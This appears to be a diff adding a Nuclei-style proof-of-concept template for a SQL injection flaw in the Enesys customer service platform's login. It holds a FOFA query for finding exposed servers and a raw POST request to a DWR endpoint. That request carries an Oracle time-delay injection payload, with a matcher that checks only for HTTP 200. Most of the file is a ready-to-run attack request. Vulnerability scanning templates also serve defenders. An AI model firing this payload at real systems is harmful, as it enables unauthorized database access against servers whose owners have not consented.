@@ -1,0 +1,43 @@
+id: poc-xeokuwan58652nbx
+info:
+  name: Enesys客户服务管理平台登录处存SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xeokuwan58652nbx'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xeokuwan58652nbx
+    fofa: body="/dwr/interface/WebContextUtil.js"
+http:
+- raw:
+  - 'POST /dwr/exec/WebContextUtil.getBm.dwr HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.285.117 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 168
+
+    Connection: close
+
+
+    callCount=1
+
+    c0-scriptName=WebContextUtil
+
+    c0-methodName=getBm
+
+    c0-id=3379_1635126202406
+
+    c0-param0=string:test'' and 1=dbms_pipe.receive_message(''RDS'', 5) and ''a''=''a
+
+
+    xml=true'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
